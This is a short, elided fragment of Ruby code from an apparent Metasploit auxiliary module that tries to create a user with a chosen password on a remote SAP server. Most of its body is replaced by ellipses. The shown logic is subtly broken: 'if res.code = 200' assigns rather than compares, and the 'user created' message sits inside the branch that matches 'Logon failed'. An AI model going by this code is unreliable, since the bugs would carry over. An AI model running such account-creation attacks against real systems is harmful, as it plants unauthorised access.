...
class Metasploit4 < Msf::Auxiliary
	...
	def exec()
		...
		begin
			print_status("[SAP] #{rhost}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")
			...
			if res.code = 200
				if res.body =~ /<h1>Logon failed<\/h1>/
					...
					print_good("[SAP] #{rhost}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created")
				end
			else
